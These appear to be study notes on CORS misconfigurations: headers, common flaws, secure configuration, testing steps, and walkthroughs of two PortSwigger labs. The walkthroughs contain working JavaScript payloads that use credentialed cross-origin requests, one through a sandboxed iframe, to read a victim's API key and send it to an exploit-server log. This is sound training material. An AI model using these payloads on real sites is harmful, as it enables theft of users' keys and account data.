- https://portswigger.net/web-security/cors#what-is-cors-cross-origin-resource-sharing
- https://portswigger.net/web-security/cors/same-origin-policy
- https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html


# Summary

Cross-Origin Resource Sharing (CORS) is a browser security mechanism that extends the Same-Origin Policy (SOP) to allow controlled access to resources located outside a given domain. While it adds flexibility to web applications, improper CORS configurations can lead to significant security vulnerabilities.

**Same-Origin Policy (SOP)**
The foundational security concept that CORS extends. SOP restricts how documents or scripts from one origin can interact with resources from another origin. Two URLs have the same origin only when they share the identical:
- Protocol (HTTP/HTTPS)
- Hostname
- Port number

### CORS Implementation

CORS functions by adding HTTP headers that specify which origins can access resources. For potentially dangerous requests, browsers send a "preflight" OPTIONS request before the actual request to check server permissions.

### Critical CORS Headers

|Header|Purpose|Security Implications|
|---|---|---|
|`Access-Control-Allow-Origin`|Specifies allowed origins|Misconfigured values can expose sensitive data|
|`Access-Control-Allow-Credentials`|Controls if authenticated requests are allowed|When set to `true` with loose origin controls, can lead to account takeover|
|`Access-Control-Allow-Methods`|Lists permitted HTTP methods|Overly permissive methods increase attack surface|
|`Access-Control-Allow-Headers`|Defines allowed request headers|Important for controlling preflight requirements|
|`Access-Control-Max-Age`|Sets preflight caching duration|Excessively long caching may prolong vulnerable states|

### Request Types

1. **Simple Requests**
    - No preflight required
    - Limited to GET, HEAD, POST
    - Restricted to specific content types
    - No custom headers allowed
2. **Preflighted Requests**
    - Sends OPTIONS request before actual request
    - Required for non-simple requests
    - Server must explicitly approve the actual request
3. **Requests with Credentials**
    - Include cookies, HTTP authentication, or client certificates
    - Require explicit permission via `Access-Control-Allow-Credentials: true`
    - Cannot use wildcard for `Access-Control-Allow-Origin`

## Common Vulnerabilities

1. **Origin Reflection Without Validation**
	The server blindly reflects any Origin header in the `Access-Control-Allow-Origin` response, allowing attackers to make cross-origin requests from any domain.

2. **Trusted Null Origin**
When servers trust the `null` origin, attackers can exploit this using:

- Data URLs (`data:text/html,<script>...</script>`)
- Sandboxed iframes
- Local HTML files

3. **Insecure Subdomain Configuration**
	Trusting all subdomains (e.g., `*.example.com`) when some may be vulnerable to XSS or other attacks.

 4. **Internal Network Exposure**
	CORS misconfigurations that allow external websites to access internal network resources, enabling server-side request forgery (SSRF) attacks.

 5. **Overly Permissive Wildcards**
	Using `*` inappropriately in CORS configurations, especially in combination with credentials.

## Secure Implementation Guidelines

1. **Strict Origin Validation**
    - Never reflect origins without validation
    - Maintain a whitelist of trusted origins
    - Implement proper regex patterns for subdomain matching
2. **Appropriate Credentials Handling**
    - Set `Access-Control-Allow-Credentials: true` only when necessary
    - Never use wildcards when credentials are allowed
    - Limit scope of authenticated endpoints
3. **Minimal Access Approach**
    - Only expose necessary endpoints via CORS
    - Restrict allowed HTTP methods to those required
    - Limit allowed headers to the minimum needed
4. **Proper Preflight Caching**
    - Set reasonable values for `Access-Control-Max-Age`
    - Consider security implications of long cache times
5. **Regular Security Testing**
    - Include CORS in security test plans
    - Perform automated and manual CORS vulnerability scanning

## Testing Methodology

1. **Origin Header Manipulation**
    - Change Origin header to unexpected values
    - Test edge cases like `null`, same-site subdomains, and similar-looking domains
2. **Credential Testing**
    - Test with and without credentials to identify potential vulnerabilities
    - Check how the application handles credentials with various origins
3. **Network Exposure**
    - Attempt to access internal resources from external origins
    - Test for internal network pivoting possibilities
4. **Subdomain Testing**
    - Identify trusted subdomains
    - Test subdomain pattern matching for weaknesses


## Tools
- https://github.com/s0md3v/Corsy
- https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8


# 1. Basic origin reflection
This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key. 
You can log in to your own account using the following credentials: `wiener:peter`

**Analysis:**
1. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
2. Send the request to Burp Repeater, and resubmit it with the added header:
    `Origin: https://example.com` and observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
3. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` (which is reflected in host) with your unique lab URL:
    ```javascript
    <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
	</script>
    ```
4. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL. Go back to the exploit server and click **Deliver exploit to victim**. Click **Access log**, retrieve and submit the victim's API key to complete the lab.

**Workflow:**
1. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
	![](Pasted%20image%2020250304113109.png)

2. Send the request to Burp Repeater, and resubmit it with the added header:
`Origin: https://example.com` and observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
	![](Pasted%20image%2020250304113230.png)
	
3. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` (which is reflected in host header) with your unique lab URL:
	![](Pasted%20image%2020250304114703.png)
4. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL. Go back to the exploit server and click **Deliver exploit to victim**. Click **Access log**, retrieve and submit the victim's API key to complete the lab.


## 2. Trusted null origin
This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
You can log in to your own account using the following credentials: `wiener:peter`

**Analysis:**
1. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
2. Send the request to Burp Repeater, and resubmit it with the added header `Origin: null.` Observe that the "null" origin is reflected in the `Access-Control-Allow-Origin` header.
3. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with the URL for your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with the exploit server ID:
    ```javascript
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
	</script>"></iframe>
    ```
    Notice the use of an iframe sandbox as this generates a null origin request.
    
4. Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL. Go back to the exploit server and click "Deliver exploit to victim". Click "Access log", retrieve and submit the victim's API key to complete the lab.

**Workflow:**
